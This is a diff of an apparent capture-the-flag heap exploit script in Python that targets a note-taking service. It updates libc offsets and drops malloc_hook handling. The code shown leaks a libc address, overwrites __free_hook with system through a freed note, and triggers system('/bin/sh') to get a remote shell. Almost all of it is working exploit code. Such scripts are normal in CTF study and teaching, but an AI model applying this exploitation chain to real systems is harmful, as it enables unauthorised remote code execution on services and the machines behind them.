@@ -89,10 +89,9 @@ def edit_note(idx, data):
   
 
 #### plt/got, rop gadgets, symbs addrs and consts ####
-ofs_malloc_hook = 0x1ebb70
-ofs_free_hook   = 0x1eeb28
-ofs_puts        = 0x0875a0
-ofs_system      = 0x055410
+ofs_free_hook   = 0x3b7e48
+ofs_puts        = 0x06fbe0
+ofs_system      = 0x0430a0
 ofs_onegadget   = ( # doesn't work
                     0xe6c7e, 
                     0xe6c81, 
@@ -109,13 +108,11 @@ s, f = sock(HOST, PORT)
 
 addr_puts = hexify(readline_after(f, ': ').strip().decode())
 libc_base   = addr_puts - ofs_puts
-malloc_hook = libc_base + ofs_malloc_hook 
 free_hook   = libc_base + ofs_free_hook
 addr_system = libc_base + ofs_system
 #one_gadget  = libc_base + ofs_onegadget[0]
 
 dbg("libc_base")
-dbg("malloc_hook")
 dbg("free_hook")
 dbg("addr_system")
 #dbg("one_gadget")
@@ -128,8 +125,8 @@ delete_note(A)
 edit_note(A, pQ(free_hook) * 2)
 _, X = create_note(0x10, b'JUNKJUNK\n')
 _, Y = create_note(0x10, pQ(addr_system) + b'\n')
-# trigger free_hook
 input('gdb?')
+# trigger free_hook
 sendline(f, '2') # delete 
 sendline_after(f, ':', str(2)) # system("/bin/sh")
 shell(s)
